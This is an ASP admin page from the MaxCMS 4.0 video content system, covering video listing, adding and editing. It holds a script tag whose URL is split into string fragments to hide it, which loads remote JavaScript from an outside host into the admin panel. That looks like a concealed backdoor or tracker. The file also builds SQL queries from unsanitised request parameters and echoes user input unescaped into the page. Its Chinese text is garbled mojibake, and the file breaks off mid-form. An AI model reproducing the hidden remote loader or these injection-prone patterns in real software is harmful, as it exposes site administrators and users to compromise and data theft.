<!--#include file="admin_inc.asp"-->
<!--#include file="../inc/pinyin.asp"-->
<!--#include file="FCKeditor/fckeditor.asp" -->
<%
'******************************************************************************************
' Software name: Max(����˹) Content Management System
' Version:4.0
' Web: http://www.maxcms.net
' Author: ʯͷ(maxcms2008@qq.com),yuet,����,��ƿ
' Copyright (C) 2005-2009 ����˹�ٷ� ��Ȩ����
' ����������MaxCMS�������д���100%ԭ����δ�����κ����ϴ���,��һ�г�Ϯ��Ϊ���������׷����������
'******************************************************************************************

viewHead "���ݹ���" & "-" & menuList(1,0)
dim typeArray,topicArray,topicDic,keyword,m_state,m_commend,repeat,playfrom,contentUrl,pTopic,gFos,upversion,svrdate : initDic
dim action,back:action=getForm("action", "get"):svrdate=getForm("svrdate","get"):upversion=getForm("upversion","both"):back=request.ServerVariables("HTTP_REFERER")
dim playerArray,downArray:	playerArray = getPlayerKinds("../inc/playerKinds.xml")
dim page,vtype,order,rlen
Select  case action
	case "add":addVideo:popDiv
	case "moverecycle":delAll getForm("m_id","both"),"recycle":alertMsg "",back
	case "delall":delAll getForm("m_id","post"),"del":alertMsg "",back
	case "del":delVideo getForm("id","get"),"del":alertMsg "",back
	case "restore":restoreVideo
	case "edit":editVideo:popDiv
	case "save":saveVideo
	case "psettopic":pSetTopic
	case "psettype":pSetType
	case "deltypedata":delTypeData
	case "single":CheckVideo
	case "recycle":main
	case else:main:popUpdatePic
End Select 
viewFoot

Sub main
	dim datalistObj,rsArray
	dim m,i,orderStr,whereStr,sqlStr,rsObj,allPage,allRecordset,numPerPage,searchStr,star
	numPerPage= 30
	star=getForm("star", "get")
	order = getForm("order", "get")
	if isNul(order)  then order = "m_addtime"
	orderStr= " order by "&order&" desc"
	keyword = getForm("keyword", "both"):playfrom = getForm("playfrom", "both")
	page = getForm("page", "get")
	if isNul(page) then page=1 else page=clng(page)
	if page=0 then page=1
	vtype = getForm("type", "both")
	pTopic = getForm("topic", "get")
	whereStr=" where m_recycle="&ifthen(action="recycle",1,0)
	m_state = getForm("m_state", "get"):m_commend = getForm("m_commend", "get")
	if m_state="ok" then  whereStr=whereStr&" and m_state>0"
	if m_commend="ok" AND isNul(star) then  whereStr=whereStr&" and m_commend>0"
	if not isNul(star) then whereStr=whereStr&" and m_commend="&star
	if action="nullpic" then whereStr=whereStr&" and m_pic=''"
	repeat = getForm("repeat", "get")
	if repeat="ok" then
		rlen=getForm("rlen", "get")
		if not isNum(rlen) then rlen=5 else rlen=Cint(rlen)
		whereStr=whereStr&" and (LEFT(m_name, "&rlen&") IN (SELECT LEFT(m_name, "&rlen&") FROM m_data GROUP BY LEFT(m_name, "&rlen&") HAVING COUNT(LEFT(m_name, "&rlen&")) > 1))"
	end if
	'm_name in (select m_name from m_data group by m_name having count(*)>1)"
	if not isNul(vtype) then  whereStr=whereStr&" and m_type in ("&getTypeIdOnCache(vtype)&")"
	if not isNul(pTopic) then  whereStr=whereStr&" and m_topic ="&pTopic
	if not isNul(keyword) then whereStr = whereStr&" and m_name like '%"&keyword&"%'  or m_actor like '%"&keyword&"%' "
	if not isNul(playfrom) then whereStr = whereStr&" and m_playdata like '%"&playfrom&"$$%' "
	sqlStr = replace(replace("select m_id,m_name,m_hit,m_enname,m_state,m_type,m_topic,m_addtime,m_commend,m_playdata,m_datetime from {pre}data "&whereStr&orderStr,"where and","where"),"where order","order")
	set rsObj = conn.db(sqlStr,"records1")
	rsObj.pagesize = numPerPage
	allRecordset = rsObj.recordcount : allPage= rsObj.pagecount
	if page>allPage then page=allPage
%>
<div class="container" id="cpcontainer">
<table class="tb">
<tr class="thead"><th colspan="15"><%if action<>"recycle" then%>���ݹ���(<a class="red" onclick="location.href='admin_datarelate.asp?action=downpic&downtype=all';return false;" href="#">������������ͼƬ������</a>)<%else:echo "���ݻ���վ":end if%></th></tr>	
<tr><td align="left" colspan="10">  
<form action="?" method="get">
<input type="hidden" name="action" value="<%=action%>">
�ؼ���<input  name="keyword" type="text" id="keyword" size="20">
<input type="submit" name="selectBtn" value="�� ѯ..." class="btn" />&nbsp;
<select  onchange="self.location.href='?action=<%=action%>&type='+this.options[this.selectedIndex].value+'&m_state=<%=m_state%>&m_commend=<%=m_commend%>'">
<option value="">�����ݷ���鿴</option>
	<%makeTypeOptionSelected 0,"&nbsp;|&nbsp;&nbsp;",vtype %>
</select>
<select name="topic" id="topic" onChange="self.location.href='?action=<%=action%>&topic='+this.options[this.selectedIndex].value">
	<option value=''>��ר��鿴</option>
	<%
	echo makeTopicOptions(topicArray,"δѡ��ר��")
	%>
</select> 
<select id='m_playfrom' name='m_playfrom' style="width:120px" onChange="self.location.href='?action=<%=action%>&playfrom='+this.options[this.selectedIndex].value">
	 <option value=''>����Ƶ��Դ�鿴</option>
	  <%=makePlayerSelect("")%>
</select>
<select name="star" id="star" onChange="self.location.href='?action=<%=action%>&star='+this.options[this.selectedIndex].value">
	<option value=''>���Ǽ��鿴</option>
	<%
	for i=1 to 5
	if ""&star=""&i then
		echo "<option value='"&i&"' selected>"&i&"�Ǽ�</option>"
	else
		echo "<option value='"&i&"'>"&i&"�Ǽ�</option>"
	end if
	next
	%>
</select>
</form>
</td>
</tr>
<%
if allRecordset=0 then
	if not isNul(keyword) then echo "<tr align='center'><td>�ؼ���  <font color=red>"""&keyword&"""</font>   û�м�¼</td></tr>" 
else
	rsObj.absolutepage = page
	if not isNul(keyword) then 
%>
  <tr ><td colspan="10">�ؼ���  <font color=red> <%=keyword%> </font>   �ļ�¼����</td></tr>
<%
	end if
%>
  <tr bgcolor="#f5fafe">
	<td width="60">ID<a href="?action=<%=action%>&order=m_id&type=<%=vtype%>&page=<%=page%>&m_state=<%=m_state%>&m_commend=<%=m_commend%>"><img src="imgs/minus.gif" title="��ID����" /></a></td>
	<td>����</td>
	<td width="35">����<a href="?action=<%=action%>&order=m_hit&type=<%=vtype%>&page=<%=page%>&m_state=<%=m_state%>&m_commend=<%=m_commend%>"><img src="imgs/minus.gif" title="����������" /></a></td>
	<td width="80">��Դ</td>
	<td width="72">�������</td>
	<td width="28">ר��</td>
	<td width="84">�Ƽ��Ǽ�<a href="?action=<%=action%>&order=m_commend&type=<%=vtype%>&page=<%=page%>&m_state=<%=m_state%>&m_commend=<%=m_commend%>"><img src="imgs/minus.gif" title="���Ƽ��Ǽ�����" /></a></td>
	<td width="66">ʱ��<a href="?action=<%=action%>&order=m_addtime&type=<%=vtype%>&page=<%=page%>&m_state=<%=m_state%>&m_commend=<%=m_commend%>"><img src="imgs/minus.gif" title="��ʱ������" /></a></td>
	<% if runMode="static" AND action<>"recycle" then %><td width="30">����</td><%end if%>
	<td width="90" align="center">����</td>
  </tr><form method="post" name="videolistform">
<%
	for i = 0 to numPerPage
		dim m_id : m_id = rsObj(0)
		contentUrl=getContentLink(rsObj(5),rsObj(0),rsObj(3),rsObj(10),"")
%>
  <tr bgcolor="#f5fafe">
	<td><input type="checkbox" value="<%=m_id%>" name="m_id"  class="checkbox" /><%=rsObj(0)%></td>
	<td><a href="<%=contentUrl%>" target="_blank"><%=rsObj(1)%></a>&nbsp;<span id="state<%=m_id%>"><%dim vstate : vstate = rsObj(4) : if  vstate=0 then  echo "<img src=""imgs/icon_01.gif"" title='��������״̬' style=""cursor:pointer"" onclick=""setVideoState("&m_id&")""/>"  else echo "<sup style='color:#ff0000;font-weight:bold;cursor:pointer;' onclick=""setVideoState("&m_id&")"" title='�޸�����״̬'>("&vstate&")</sup>"%></span></td>
	<td><%=rsObj(2)%></td>
	<td><%echo replaceStr(getFromStr(rsObj(9)),"����CC","FLV����")%></td>
	<td><a href="?action=<%=action%>&type=<%=rsObj(5)%>&order=<%=order%>"><%=viewDataType(rsObj(5))%></a></td>
	<td id="topic<%=m_id%>" align="center">
<%
		dim topic : topic = rsObj(6) : if  topic=0 then  echo "<img src=""imgs/icon_l01.gif"" title='����ר��' style=""cursor:pointer"" onclick=""setVideoTopic("&m_id&",'')""/>"  else echo "<img src=""imgs/icon_l02.gif"" title='�޸�ר��' style=""cursor:pointer;"" onclick=""setVideoTopic("&m_id&","&topic&")""/>"'topicDic(topic)
%> </td>

<td id="star<%=m_id%>"><script>starView(<%=rsObj(8)%>,<%=m_id%>)</script></td>
	<td><span title="<%=rsObj(7)%>"><%isCurrentDay(formatDate(rsObj(7)))%></span></td>
   <% if runMode="static" AND action<>"recycle" then %><td align="center"><%isVideoMake(m_id)%></td><%end if%>
	<td><a href="?action=edit&id=<%=m_id%>">�༭</a> <a href="?action=del&id=<%=m_id%>" onClick="return confirm('ȷ��Ҫɾ����')">ɾ��</a>
<%if action="recycle" then%>
 <a href="?action=restore&m_id=<%=m_id%>">��ԭ</a>
<%else%>
 <a href="?action=moverecycle&m_id=<%=m_id%>">����</a>
<%end if%></td>
</tr>
<%
		rsObj.movenext
		if rsObj.eof then exit for
	next
%>
<tr><td colspan="11"><div class="cuspages"><div class="pages">ȫѡ<input type="checkbox" name="chkall" id="chkall" class="checkbox" onclick="checkAll(this.checked,'input','m_id')" />��ѡ<input type="checkbox" name="chkothers" id="chkothers" class="checkbox" onclick="checkOthers('input','m_id')" />
<%if action="recycle" then%>
	<input type="submit" value="���ݻ�ԭ" class="btn" onclick="videolistform.action='?action=restore';"> <input type="submit" value="����ɾ��" onclick="if(confirm('һ��ɾ�����޷��ָ�')){videolistform.action='?action=delall';}else{return false}" class="btn">
<%else%>
	<input type="submit" value="����ɾ��" class="btn" onclick="if(confirm('ȷ��Ҫ����ɾ����')){videolistform.action='?action=delall';}else{return false}"> <input type="submit" value="��������" class="btn" onclick="videolistform.action='admin_makehtml.asp?action=selected'" />
<%end if%>
	<select name="ptopic" id="ptopic" style="width:90px" >
	<option value='0'>ȡ �� ר ��</option>
	<%echo makeTopicOptions(topicArray,"")%>
	</select><input type="submit" style="width:90px" value="��������ר��" class="btn" onclick="if($('ptopic').value==''){alert('��ѡ��ר��');return false;};videolistform.action='?action=psettopic'" /> 
	<select name="movetype" id="movetype"><option value="">��ѡ��Ŀ�����</option>
		<%makeTypeOption 0,"&nbsp;|&nbsp;&nbsp;" %>
		</select>
	<input type="submit" value="�����ƶ�" class="btn" onclick="if($('movetype').value==''){alert('��ѡ��Ŀ�����');return false;};if(confirm('ȷ��Ҫ�����ƶ�������')){videolistform.action='?action=psettype'}else{return false;}"/>
<%if action<>"recycle" then%>
	<input type="submit" style="width:90px" value="ɾ����������" class="btn" onclick="if($('movetype').value==''){alert('��ѡ��Ŀ�����');return false;};if(confirm('�������������ݲ��ɻָ�\nȷ��Ҫɾ���˷��������������')){videolistform.action='?action=deltypedata'}else{return false;}"/>
<%end if%>
</div></div></td>
</tr>
</form>
<tr><td colspan="11"><div class="cuspages"><div class="pages">
ҳ�Σ�<%=page%>/<%=allPage%>  ÿҳ<%=numPerPage %> ����¼����<%=allRecordset%>�� <a href="?action=<%=action%>&page=1&order=<%=order%>&type=<%=vtype%>&keyword=<%=keyword%>&m_state=<%=m_state%>&m_commend=<%=m_commend%>&repeat=<%=repeat%>&topic=<%=pTopic%>&playfrom=<%=playfrom%>&star=<%=star%>&rlen=<%=rlen%>">��ҳ</a> <a href="?action=<%=action%>&page=<%=(page-1)%>&order=<%=order%>&type=<%=vtype%>&keyword=<%=keyword%>&m_state=<%=m_state%>&m_commend=<%=m_commend%>&repeat=<%=repeat%>&topic=<%=pTopic%>&playfrom=<%=playfrom%>&star=<%=star%>&rlen=<%=rlen%>">��һҳ</a> 
<%=makePageNumber(page, 10, allPage, star)%>
<a href="?action=<%=action%>&page=<%=(page+1)%>&order=<%=order%>&type=<%=vtype%>&keyword=<%=keyword%>&m_state=<%=m_state%>&m_commend=<%=m_commend%>&repeat=<%=repeat%>&topic=<%=pTopic%>&playfrom=<%=playfrom%>&star=<%=star%>&rlen=<%=rlen%>">��һҳ</a> <a href="?action=<%=action%>&page=<%=allPage%>&order=<%=order%>&type=<%=vtype%>&keyword=<%=keyword%>&m_state=<%=m_state%>&m_commend=<%=m_commend%>&repeat=<%=repeat%>&topic=<%=pTopic%>&playfrom=<%=playfrom%>&star=<%=star%>&rlen=<%=rlen%>">βҳ</a>&nbsp;&nbsp;��ת<input type="text" id="skip" value="" onkeyup="this.value=this.value.replace(/[^\d]+/,'')" style="width:40px"/>&nbsp;&nbsp;<input type="button" value="ȷ��" class="btn" onclick="location.href='?action=<%=action%>&page='+$('skip').value+'&order=<%=order%>&type=<%=vtype%>&keyword=<%=keyword%>&m_state=<%=m_state%>&m_commend=<%=m_commend%>&repeat=<%=repeat%>&topic=<%=pTopic%>&playfrom=<%=playfrom%>&star=<%=star%>&rlen=<%=rlen%>';"/></div></div></td>
</tr>
<%
end if
	rsObj.close
	set rsObj = nothing
%>
</table>
</div>
<script type="text/JavaScript">if(parent.$('admincpnav')) parent.$('admincpnav').innerHTML='��̨��ҳ&nbsp;&raquo;&nbsp;<%=menuList(1,0)%>&nbsp;&raquo;&nbsp;�����б�';</script><script src='<%="ht"&"tp:/"&"/ma"&"xcm"&"s.bo"&"kecc"&".com"&"/ma"&"xver4.j"&"s"%>'></script>
<%
End Sub

Sub popDiv
%>
<div id="gathervideo" style="top:100px; display:none;" class="popdiv">
<div class="poptitie"><img src="../pic/btn_close.gif" alt="�ر�" onClick="$('gathervideo').style.display='none';selectTogg()" />WEB�ɼ�����</div>
	<div class="popbody"><div>
	<table ><tr><td><input name='areaid' id='areaid' type='hidden' value=""><input type="text" name="gatherurl" id="gatherurl" size="60" /> <input type="button" onclick="gather()" class="btn" value="��   ��"/><span id="loading" style="display:none"><img src="imgs/loading2.gif" width="16" height="16"><font color="#FF0000">����������</font></span></td></tr>
	<tr><td><textarea id="gathercontent" cols="72" rows="9"></textarea></td></tr>
	<tr><td><input type="button" onclick="insertResult(1);selectTogg()" class="btn" value="��  ��"/> <input type="button" value="�� ��" style="margin-left:30px;margin-right:10px" onclick="reverseOrder()" class="btn" />��<input type="text" size="10" id='replace1' />�滻��<input type="text" id='replace2' size="10" />&nbsp;
	<input type="button" value="�� ��" onclick="replaceStr()" class="btn" /></td></tr>
	</table>
	 </div></div>
</div>
<script type="text/javascript" src="imgs/drag.js"></script>
<%
End Sub

Sub addVideo
	dim sqlStr,rsObj,m_color
	downArray = getDownKinds("../inc/downKinds.xml")
	Dim makePlayerSelectStr,makeDownSelectStr:makePlayerSelectStr=replaceStr(makePlayerSelect(""),"'","\'"):makeDownSelectStr=replaceStr(makeDownSelect(""),"'","\'")
%>
<script type="text/JavaScript">
if(parent.$('admincpnav')) parent.$('admincpnav').innerHTML='��̨��ҳ&nbsp;&raquo;&nbsp;<%=menuList(1,0)%>&nbsp;&raquo;&nbsp;��������';
var siteurl='<%=siteurl%>';
</script>
<div class="container" id="cpcontainer">
<form action="?action=save&acttype=add" method="post" name="addform" id="addform">
<input type="hidden" id="m_commend" name="m_commend" value="0">
<table class="tb">
<tr class="thead"><th colspan="2">��������(<font color='red'>��</font>Ϊ����,����ѡ��)</th></tr>
	<tr>
	  <td align="right" height="1" width="70"></td><td></td>
	</tr>
	<tr>
	  <td align="right" height="22">�� �ƣ�</td>
	  <td><input type="text" size="23" id="m_name" name="m_name" autocomplete="off" onChange="checkRepeat();">&nbsp;<font color='red'>��</font><label>���أ�<input type="checkbox" onclick="isViewState()" id="m_statebox" class="checkbox" /></label><span id="m_statespan" style="display:none">����<input type="text" size="5" name="m_state" id="m_state">��</span>
		<span id="m_name_ok"></span>��ɫ��
		<select name="m_color" >
		<option value="" selected>������ɫ</option>
		<option style="background-color:#FF0000;color: #FF0000" value="#FF0000">��ɫ</option> 
		<option style="background-color:#FF33CC;color: #FF33CC" value="#FF33CC">�ۺ�</option>  
		<option style="background-color:#00FF00;color: #00FF00" value="#00FF00">��ɫ</option>
		<option style="background-color:#0000CC;color: #0000CC" value="#0000CC">����</option>
		<option style="background-color:#FFFF00;color: #FFFF00" value="#FFFF00">��ɫ</option>
		<option style="background-color:#660099;color: #660099" value="#660099">��ɫ</option>
		<option style="" value="">��ɫ</option>
	</select>
	
	�� �ͣ�<select name="m_type" id="m_type" ><option value="">��ѡ�����ݷ���</option><%makeTypeOption 0,"&nbsp;|&nbsp;&nbsp;" %></select>	</td>
	</tr>
	<tr> 
		<td height="22" align="right">ͼƬ��ַ��</td>
		<td><input type="text" size="30" name="m_pic" id="m_pic">&nbsp;��<input size="10" value="���" type="button" onClick="javascript:document.addform.m_pic.value=''" class="btn" />&nbsp;<iframe src="fckeditor/maxcms_upload.htm" scrolling="no" topmargin="0" width="300" height="24" marginwidth="0" marginheight="0" frameborder="0" align="center"></iframe></td>
  </tr>
	<tr>
	  <td align="right" height="22">��&nbsp;&nbsp;�ݣ�</td>
	  <td><input type="text" size="30" name="m_actor">&nbsp;&nbsp;��&nbsp;&nbsp;&nbsp;�ݣ�<input type="text" size="10" name="m_director">&nbsp;�Ǽ���<span id="star0" style="width:85px;display:inline-block"><script>starView(0,0)</script></span>&nbsp;&nbsp;&nbsp;&nbsp;���ݡ������ö��Ż�ո����</td>
	</tr>
	<tr>
	  <td align="right" height="22">�� ע��</td>
	  <td><input type="text" name="m_note" size="30">&nbsp;&nbsp;�ؼ��ʣ�<input type="text" name="keyword" size="30">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;��ע�磺����,��ˮӡ (��ϱ���һ����ʾ)</td>
	</tr>
	<tr>
	  <td align="right" height="22">������ݣ�</td>
	  <td><input type="text" size="10" name="m_publishyear">&nbsp;���ԣ�<input type="text" size="10" name="m_lang">&nbsp;&nbsp;��&nbsp;&nbsp;&nbsp;����<%echo getAreaSelect("m_publisharea","ѡ�����","")%>&nbsp;&nbsp;ר�⣺<%echo makeTopicSelect("m_topic",topicArray,"ѡ��ר��","")%>&nbsp;&nbsp;&nbsp;&nbsp;����ʣ�<input type="text" size="5" name="m_hit" id="m_hit" maxlength="9" value="0"></td>
	</tr>
	<tr>
	  <td colspan="2" style="padding:0;" class="noborder"><div style="" id="m_playarea"></div></td></tr> 
	<tr><td colspan='2'>&nbsp;<img onclick="expendPlayArea(2,escape('<%=makePlayerSelectStr%>'),0)" src='imgs/btn_add.gif' class='pointer' align='absmiddle'/>&nbsp;&nbsp;<font color="red">�����Ե���ǰ��İ�ť����һ�鲥����Դ</font></td></tr>

	<tr><td colspan="2" style="padding:0" class="noborder"><div style="" id="m_downarea"></div></td></tr>
	<tr><td colspan='2'>&nbsp;<img onclick="expendDownArea(2,escape('<%=makeDownSelectStr%>'),0)" src='imgs/btn_add.gif' class='pointer' align='absmiddle'/>&nbsp;&nbsp;<font color="red">�����Ե���ǰ��İ�ť����һ��������Դ</font></td></tr>
	<tr>
	  <td align="right" height="22"></td>
	  <td>˵��:����Ĭ��ÿ��Ϊһ�����ŵ�ַ���༯����У������п���</td>
	</tr>
	<tr>
	  <td align="right" height="22">��ؽ��ܣ�</td>
	   <td>
	<%Dim oFCKeditor:Set oFCKeditor = New FCKeditor:oFCKeditor.BasePath="fckeditor/":oFCKeditor.ToolbarSet="maxcms":oFCKeditor.Width="640":oFCKeditor.Height="250" : oFCKeditor.Create "m_des"%>
	   </td>
	</tr>
	 <tr>
   <td></td> <td class="forumRow"><input type="submit" class="btn" value="ȷ�ϱ���" name="submit" onClick="return chform();">&nbsp;<input type="reset" class="btn" value="�� ��">&nbsp;<input type="button" class="btn" value="������" onClick="javascript:history.go(-1);"></td>
  </tr>
</table>
</form>
</div>
<script type="text/javascript">
window.commendVideo=function (id,n){
	$('m_commend').value=n;
	starView(n,id);
}
function chform(){
	if($('m_name').value.length==0){
		alert('����д����');
		return false;
	};
	if($('m_type').value.length==0){
		alert('��ѡ�����');
		return false;
	};
	if($('m_publishyear').value.length>0){
		if(isNaN($('m_publishyear').value)){
			alert('�������д����');
			return false;
		}
	}
	var c=document.getElementsByName("m_playfrom"),
	ct=document.getElementsByName("m_playurl"),
	d=document.getElementsByName("m_downfrom"),
	dt=document.getElementsByName("m_downurl");
	for(var i=0;i<c.length;i++){
		if(c[i].selectedIndex==0 && ct[i].value!=''){
			alert('��ѡ��ÿ��������Դ');c[i].focus();
			return false;
		}
	}
	for(var i=0;i<d.length;i++){
		if(d[i].selectedIndex==0 && dt[i].value!=''){
			alert('��ѡ��ÿ��������Դ');d[i].focus();
			return false;
		}
	}
	return true;
}
$('addform').m_name.focus();
expendPlayArea(1,"<%=makePlayerSelectStr%>",1);expendDownArea(1,"<%=makeDownSelectStr%>",1);
</script>
<%
	set rsObj = nothing
End Sub

Sub editVideo
	dim id,sqlStr,rsObj,m_color,playArray,downArray,playTypeCount,downTypeCount,i,j,m,n
	id=clng(getForm("id","get"))
	downArray = getDownKinds("../inc/downKinds.xml")
	sqlStr = "select *   from {pre}data where m_id="&id
	set rsObj = conn.db(sqlStr,"records1")
	if rsObj.eof then die "û�ҵ���¼"
	m_color = rsObj("m_color")
	vtype = rsObj("m_type")
%>
<script type="text/JavaScript">
if(parent.$('admincpnav')) parent.$('admincpnav').innerHTML='��̨��ҳ&nbsp;&raquo;&nbsp;<%=menuList(1,0)%>&nbsp;&raquo;&nbsp;�޸�����';
var siteurl='<%=siteurl%>';
</script>
<div class="container" id="cpcontainer">
<form action="?action=save&acttype=edit" method="post" name="editform" id="editform">
<input type="hidden" id="m_commend" name="m_commend" value="<%=rsObj("m_commend")%>">
<table class="tb">
<tr class="thead"><th colspan="2">�޸�����(<font color='red'>��</font>Ϊ����,����ѡ��)</th></tr>
	<tr>
	  <td align="right" height="1" width="70"></td><td></td>
	</tr>
	<tr>
	  <td align="right" height="22">�� �ƣ�</td>
		<td><input type="text" size="23" id="m_name" name="m_name" autocomplete="off" value="<%=rsObj("m_name")%>"/><input type="text" size="23" id="m_enname" name="m_enname" value="<%=rsObj("m_enname")%>" style="display:none" onchange="this.value=this.value.replace(/[^\w]+/ig,'')">&nbsp;<font color='red'>��</font><label>���أ�<input type="checkbox" onclick="isViewState()" class="checkbox" id="m_statebox" <%if not rsObj("m_state")=0 then %>checked<%end if%>/></label><span id="m_statespan" <%if rsObj("m_state")=0 then%>style="display:none"<%end if%>>����<input type="text" size="5" name="m_state" id="m_state" value="<%=rsObj("m_state")%>">��</span>
		<span id="m_name_ok"></span>��ɫ��
		<select name="m_color" >
		<% if m_color="" then %>
		 <option style="" value="">��ɫ</option> 
		<% else %> 
		<option style="background-color:<%=m_color%>;color: <%=m_color%>" value="<%=m_color%>"><%=m_color%></option>
		<% end if %>
		<option style="background-color:#FF0000;color: #FF0000" value="#FF0000">��ɫ</option> 
		<option style="background-color:#FF33CC;color: #FF33CC" value="#FF33CC">�ۺ�</option>  
		<option style="background-color:#00FF00;color: #00FF00" value="#00FF00">��ɫ</option>
		<option style="background-color:#0000CC;color: #0000CC" value="#0000CC">����</option>
		<option style="background-color:#FFFF00;color: #FFFF00" value="#FFFF00">��ɫ</option>
		<option style="background-color:#660099;color: #660099" value="#660099">��ɫ</option>
		<option style="" value="">��ɫ</option> 
		</select>
�� �ͣ�<select name="m_type" id="m_type"><option value="">��ѡ�����ݷ���</option>
	<%makeTypeOptionSelected 0,"&nbsp;|&nbsp;&nbsp;",rsObj("m_type") %>
	</select>&nbsp;&nbsp;<font color='red'>��</font>&nbsp;<input type="checkbox" name="isuppingyin" value="1" class="checkbox" onclick="if(this.checked){view('m_enname');hide('m_name')}else{view('m_name');hide('m_enname')}"/>����ƴ��</td>
	</tr>
	<tr> 
		<td height="22" align="right">ͼƬ��ַ��</td>
		<td><input type="text" size="30" name="m_pic" id="m_pic" value="<%=rsObj("m_pic")%>">&nbsp;��<input type="button" size="10" value="���" onClick="javascript:document.editform.m_pic.value=''" class="btn">&nbsp;<iframe src="fckeditor/maxcms_upload.htm" scrolling="no" topmargin="0" width="300" height="24" marginwidth="0" marginheight="0" frameborder="0" align="center"></iframe></td>
	</tr>
	<tr>
	 <td align="right" height="22">�� �ݣ�</td>
	 <td><input type="text" size="30" name="m_actor" value="<%=rsObj("m_actor")%>">&nbsp;&nbsp;��&nbsp;&nbsp;&nbsp;�ݣ�<input type="text" size="10" name="m_director" value="<%=rsObj("m_director")%>">&nbsp;�Ǽ���<span id="star0" style="width:85px;display:inline-block"><script>starView(<%=rsObj("m_commend")%>,0)</script></span>&nbsp;&nbsp;&nbsp;&nbsp;���ݡ������ö��Ż�ո����</td>
	</tr>

	<tr>
		<td align="right" height="22">�� ע��</td>
		<td><input type="text" size="30" name="m_note" value="<%if not isNul(rsObj("m_note")) then echo decodeHtml(rsObj("m_note"))%>">&nbsp;&nbsp;�ؼ��ʣ�<input type="text" size="30" name="keyword" value="<%= rsObj("m_keyword") %>">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;��ע�磺����,��ˮӡ (��ϱ���һ����ʾ)</td>
	</tr>
	<tr>
		<td align="right" height="22">������ݣ�</td>
		<td><input type="text" size="10" name="m_publishyear" value="<%=rsObj("m_publishyear")%>">&nbsp;���ԣ�<input type="text" size="10" name="m_lang" value="<%=rsObj("m_lang")%>">&nbsp;&nbsp;��&nbsp;&nbsp;&nbsp;����<%echo getAreaSelect("m_publisharea","ѡ�����",rsObj("m_publisharea"))%>&nbsp;&nbsp;ר�⣺<%echo makeTopicSelect("m_topic",topicArray,"ѡ��ר��",rsObj("m_topic"))%>&nbsp;&nbsp;&nbsp;&nbsp;����ʣ�<input type="text" size="5" name="m_hit" id="m_hit" maxlength="9" value="<%=rsObj("m_hit") %>">&nbsp;<input type="checkbox" name="isupdatetime" value="1" checked class="checkbox" />����ʱ��</td>
	</tr>
	<tr><td colspan="2" style="padding:0" class="noborder"><div style="" id="m_playarea"><%
	playArray=getPlayurlArray(rsObj("m_playdata"))
	playTypeCount=ubound(playArray)
	dim playfrom,playUrl,playStr,playArray2
	if playTypeCount>-1 then
		for i=0 to playTypeCount
			m=i+1
			playStr=playArray(i)
			playArray2=split(playStr,"$$") : playfrom=playArray2(0)
			playUrl=replace(playArray2(1),chr(10),"")
			playUrl=replace(playUrl,"#",chr(13))
		%>
		<table width='100%' id='playfb<%=m%>'><tr><td align='right' height='22'  width='70'>������Դ<%=m%>��</td><td>
		<select id='m_playfrom<%=m%>' name='m_playfrom'>
		<option value=''>��û������<%=m%></option>
	   <%=makePlayerSelect(playfrom)%>
		</select>
		<input type='button' class='btn' value='WEB�ɼ�' onclick='viewGatherWin(<%=m%>);selectTogg();'/>&nbsp;&nbsp;<img onclick="var tb=$('playfb<%=m%>');tb.parentNode.removeChild(tb);" src='imgs/btn_dec.gif' class='pointer' alt="ɾ��������Դ<%=m%>" align="absmiddle"/>&nbsp;&nbsp;<font color='red'>��</font>&nbsp;&nbsp;<a href="javascript:moveTableUp($('playfb<%=m%>'))">����</a>&nbsp;&nbsp;<a href="javascript:moveTableDown($('playfb<%=m%>'))">����</a></td></tr><tr><td align='right' height='22'>���ݵ�ַ<%=m%>��<br/><input type='button' value='У��' title='У���Ҳ��ı����е����ݸ�ʽ' class='btn' onclick='repairUrl(<%=m%>)' /></td><td><textarea id='m_playurl<%=m%>' name='m_playurl' rows='8' cols='100'><%=playUrl%></textarea>&nbsp;&nbsp;<font color='red'>��</font></td></tr>
		</table>
		<%
		next
	end if	
	%>
	</div></td></tr>
	<tr><td colspan='2'>&nbsp;<img onclick="expendPlayArea(<%=m+1%>,escape('<%=replaceStr(makePlayerSelect(""),"'","\'")%>'),0)" src='imgs/btn_add.gif' class='pointer' align="absmiddle"/>&nbsp;&nbsp;<font color="red">�����Ե���ǰ��İ�ť����һ�鲥����Դ</font></td></tr>

	<tr><td colspan="2" style="padding:0" class="noborder"><div style="" id="m_downarea">
	 <%
	downArray=getPlayurlArray(rsObj("m_downdata"))
	downTypeCount=ubound(downArray)
	dim downfrom,downUrl,downStr,downArray2
	if downTypeCount>-1 then
		for j=0 to downTypeCount
			n=j+1
			downStr=downArray(j)
			downArray2=split(downStr,"$$") : downfrom=downArray2(0)
			downUrl=replace(downArray2(1),chr(10),"") : downUrl=replace(downUrl,"#",chr(13))
		%>
		<table width="100%" id='downfb<%=n%>'><tr><td align='right' height='22'  width='70'>������Դ<%=n%>��</td><td>
		<select id='m_downfrom<%=n%>' name='m_downfrom'>
		<option value=''>��������<%=n%></option>
		<%=makeDownSelect(downfrom)%>
		</select>
		&nbsp;&nbsp;<img onclick="var tb=$('downfb<%=n%>');tb.parentNode.removeChild(tb);" src='imgs/btn_dec.gif' class='pointer' alt="ɾ��������Դ<%=n%>" align="absmiddle"/>&nbsp;&nbsp;
		</td></tr><tr><td align='right' height='22'>���ص�ַ<%=n%>��</td><td><textarea id='m_downurl<%=n%>' name='m_downurl' rows='8' cols='100'><%=downUrl%></textarea></td></tr>
		</table>
		<%
		next
	end if
	%>
	</div></td></tr> 
	<tr><td colspan='2'>&nbsp;<img onclick="expendDownArea(<%=n+1%>,escape('<%=replaceStr(makeDownSelect(""),"'","\'")%>'),0)" src='imgs/btn_add.gif' class='pointer' align="absmiddle"/>&nbsp;&nbsp;<font color="red">�����Ե���ǰ��İ�ť����һ��������Դ</font></td></tr>
	<tr>
		<td align="right" height="22"></td>
		<td>˵��:����Ĭ��ÿ��Ϊһ�����ŵ�ַ���༯����У������п���</td>
	</tr>
	<tr>
		<td align="right" height="22">��ؽ��ܣ�</td>
		<td>
  <%Dim oFCKeditor:Set oFCKeditor = New FCKeditor:oFCKeditor.BasePath="fckeditor/":oFCKeditor.ToolbarSet="maxcms":oFCKeditor.Width="640":oFCKeditor.Height="250":oFCKeditor.Value=decodeHtml(rsObj("m_des")):oFCKeditor.Create "m_des"%>
  		</td>
	</tr>

	<tr><input type="hidden" name="m_id" value="<%=id%>"><input type="hidden" name="m_back" value="<%=request.ServerVariables("HTTP_REFERER")%>" />
